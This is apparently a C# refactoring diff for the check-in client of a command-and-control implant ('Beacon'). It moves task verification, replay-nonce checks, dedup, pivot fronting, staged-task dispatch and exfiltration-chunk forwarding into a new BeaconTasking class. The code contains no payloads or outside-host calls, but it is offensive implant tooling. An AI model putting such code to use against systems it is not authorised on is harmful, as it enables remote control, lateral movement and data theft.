@@ -67,6 +67,10 @@ internal sealed class Beacon : ICheckInClient
     // check-in client covering one run the same way the nonce floor is.
     private readonly HeldTaskLedger _held;
 
+    // The shared task-acceptance pipeline (fronting gate, verification,
+    // dedup, staged/channel/inline shapes) over this client's per-run state.
+    private readonly BeaconTasking _tasking;
+
     /// <summary>
     /// Builds a Beacon whose handler registry carries no enroll bundle, so the
     /// lateral.move handler reports derivation as unavailable.
@@ -135,6 +139,7 @@ internal sealed class Beacon : ICheckInClient
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
+        _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
     }
 
     /// <summary>
@@ -307,19 +312,13 @@ internal sealed class Beacon : ICheckInClient
         var writeGate = new SemaphoreSlim(1, 1);
         var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
         using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        async Task Write(Frame frame, CancellationToken ct) => await WriteFrameAsync(call, writeGate, frame, ct);
 
         // Results whose delivery died with an earlier stream ride this one
         // first (architecture.md Sec 10.3 -- the dispatch strand): the server
         // records first-wins, so a re-send of a result the original stream
         // already landed is absorbed, and one it lost is recovered.
-        foreach (var remembered in _held.Undelivered())
-        {
-            await WriteFrameAsync(
-                call, writeGate,
-                BeaconFrames.ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
-                cancellationToken);
-            _held.MarkDelivered(remembered.TaskId);
-        }
+        await _tasking.ReplayUndeliveredAsync(Write, cancellationToken);
 
         try
         {
@@ -341,149 +340,18 @@ internal sealed class Beacon : ICheckInClient
 
                 // The dispatch strand's ack half (architecture.md Sec 10.3):
                 // delivery evidence for the parsed frame, sent before anything
-                // runs -- including a task the verifier below will refuse,
+                // runs -- including a task the acceptance below will refuse,
                 // because a refused task is still a delivered one.
                 if (acks)
-                    await WriteFrameAsync(call, writeGate, BeaconFrames.AckFrame(task.TaskId), cancellationToken);
+                    await Write(BeaconFrames.AckFrame(task.TaskId), cancellationToken);
 
-                // Fronted tasking (architecture.md Sec 5.2): a frame marked
-                // with another implant's id is a Pivot child's tasking this
-                // stream executes on the child's behalf -- the child has no
-                // process to check in with. The gate is the fronted ledger:
-                // only a child this implant enrolled is frontable, so tasking
-                // for any other implant is refused on the task even when the
-                // signature verifies (the signature binds the tuple to the
-                // target id, Sec 9; it does not say this implant fronts the
-                // target).
-                var targetId = _implantId;
-                var fronted = false;
-                if (task.HasTargetImplantId && task.TargetImplantId.Length > 0 && task.TargetImplantId != _implantId)
-                {
-                    targetId = task.TargetImplantId;
-                    fronted = true;
-                    if (_fronted is null || !_fronted.Knows(targetId))
-                    {
-                        _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
-                        await ReportResultAsync(
-                            call, writeGate, task.TaskId, TaskOutcome.Failed,
-                            $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed",
-                            cancellationToken);
-                        continue;
-                    }
-                }
-
-                // Command signing (architecture.md Sec 9): verify the teamserver's
-                // signature before any handler runs, and -- once the replay-nonce
-                // arm is live -- that the task's nonce advances the accepted
-                // floor. A task that fails either is reported Failed with the
-                // cause -- the operator sees the rejection on the task itself,
-                // so a replayed frame surfaces as a refused task -- and nothing
-                // executes. The signed tuple's implant id is the target's own:
-                // this implant's for own tasking, the fronted child's for
-                // fronted tasking. The nonce arm follows the target too -- a
-                // pivot child never handshakes, so its tasking keeps the
-                // nonce-less shape and a fresh tracker keeps this implant's
-                // negotiated floor from refusing it.
-                TaskOutcome outcome;
-                string output;
-                IReadOnlyList<ExfilChunk> chunks;
-                var verdict = TaskingVerifier.Verify(
-                    targetId, task, _cas, fronted ? new TaskNonceTracker() : _nonces);
-                if (verdict != TaskingVerdict.Accepted)
-                {
-                    var cause = verdict switch
-                    {
-                        TaskingVerdict.RejectedReplay =>
-                            $"task rejected: replayed tasking (nonce {task.TaskNonce} at or below the accepted floor); not executed",
-                        TaskingVerdict.RejectedNoNonce =>
-                            "task rejected: no task nonce after the replay-nonce handshake; not executed",
-                        _ => "task rejected: signature verification failed; not executed",
-                    };
-                    _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
-                    outcome = TaskOutcome.Failed;
-                    output = cause;
-                    chunks = Array.Empty<ExfilChunk>();
-                }
-                else if (_held.Contains(task.TaskId))
-                {
-                    // The dispatch strand's dedup half (architecture.md Sec
-                    // 10.3), deliberately AFTER verification: the replay
-                    // defense stays ahead of the ledger, so a verbatim replay
-                    // of a held task still falls at the nonce floor (or the
-                    // signature) and is refused on the task. A redelivery
-                    // that cleared verification re-sends the cached result
-                    // unconditionally -- a redelivery implies the server
-                    // holds no recorded result (its first-wins dropped or
-                    // never saw the original), and the duplicate a completed
-                    // server would see is a no-op there. Nothing re-executes.
-                    if (_held.TryGetResult(task.TaskId, out var heldOutcome, out var heldOutput))
-                    {
-                        await ReportResultAsync(
-                            call, writeGate, task.TaskId, heldOutcome, heldOutput, cancellationToken);
-                        _log.WriteLine($"task {task.TaskId} redelivered; answered from the ledger without re-running");
-                    }
-                    else
-                    {
-                        // Held but unfinished (a channel that died with its
-                        // stream, a task still running): nothing to re-send
-                        // and nothing to re-run.
-                        _log.WriteLine($"task {task.TaskId} redelivered while still held; re-acked without re-running");
-                    }
-                    continue;
-                }
-                else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
-                {
-                    // The streaming shape: the task opens a channel instead of
-                    // completing inline. A poll cycle cannot host one -- its
-                    // read loop ends on the idle window, and there is no
-                    // downstream half to carry input -- so the refusal is
-                    // reported on the task itself. On a live stream the handler
-                    // runs in the background and reports its own final
-                    // TaskResult; the loop keeps reading while it runs.
-                    _held.Hold(task.TaskId);
-                    if (IsPoll)
-                    {
-                        _log.WriteLine($"task {task.TaskId} refused: no channel on a poll cycle");
-                        await ReportResultAsync(
-                            call, writeGate, task.TaskId, TaskOutcome.Failed,
-                            $"{task.Verb} requires a stream-mode check-in; a poll cycle carries no channel",
-                            cancellationToken);
-                    }
-                    else
-                    {
-                        StartChannel(call, writeGate, liveChannels, task, channelHandler, channelsGone.Token);
-                    }
-                    continue;
-                }
-                else if (task.HasStagedBytes)
-                {
-                    (outcome, output) = await RunStagedTaskAsync(call, writeGate, task, cancellationToken);
-                    chunks = Array.Empty<ExfilChunk>();
-                }
-                else
-                {
-                    (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
-                }
-
-                // Held from here on whatever the outcome was -- a refused
-                // task is parsed and answered too, and its redelivery is
-                // answered from the cache the same way (the channel branch
-                // held above, before its early continue).
-                _held.Hold(task.TaskId);
-                await ReportResultAsync(call, writeGate, task.TaskId, outcome, output, cancellationToken);
-
-                // Out-of-band exfil chunks follow the TaskResult on the same stream.
-                // Each carries the task id so the server reassembles and routes them
-                // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
-                foreach (var chunk in chunks)
-                {
-                    chunk.TaskId = task.TaskId;
-                    await WriteFrameAsync(call, writeGate, new Frame
-                    {
-                        Payload = ByteString.CopyFrom(chunk.ToByteArray()),
-                        Kind = FrameKind.ExfilChunk,
-                    }, cancellationToken);
-                }
+                await _tasking.AcceptAsync(
+                    task,
+                    IsPoll,
+                    Write,
+                    (staged, ct) => RunStagedTaskAsync(call, writeGate, staged, ct),
+                    (started, handler) => StartChannel(call, writeGate, liveChannels, started, handler, channelsGone.Token),
+                    cancellationToken);
             }
 
             // Poll mode: the queue is drained and the idle window closed the read
@@ -541,23 +409,6 @@ internal sealed class Beacon : ICheckInClient
         {
             writeGate.Release();
         }
-    }
-
-    // Writes one task result and caches it in the held-task ledger: the cache
-    // is what a redelivery re-sends, and the delivery mark is what a dying
-    // stream clears so the next connection re-sends it (first-wins
-    // server-side).
-    private async Task ReportResultAsync(
-        AsyncDuplexStreamingCall<Frame, Frame> call,
-        SemaphoreSlim writeGate,
-        string taskId,
-        TaskOutcome outcome,
-        string output,
-        CancellationToken cancellationToken)
-    {
-        await WriteFrameAsync(call, writeGate, BeaconFrames.ResultFrame(taskId, outcome, output), cancellationToken);
-        _held.Remember(taskId, outcome, output);
-        _held.MarkDelivered(taskId);
     }
 
     // Opens a channel for a dispatched streaming task and starts its handler
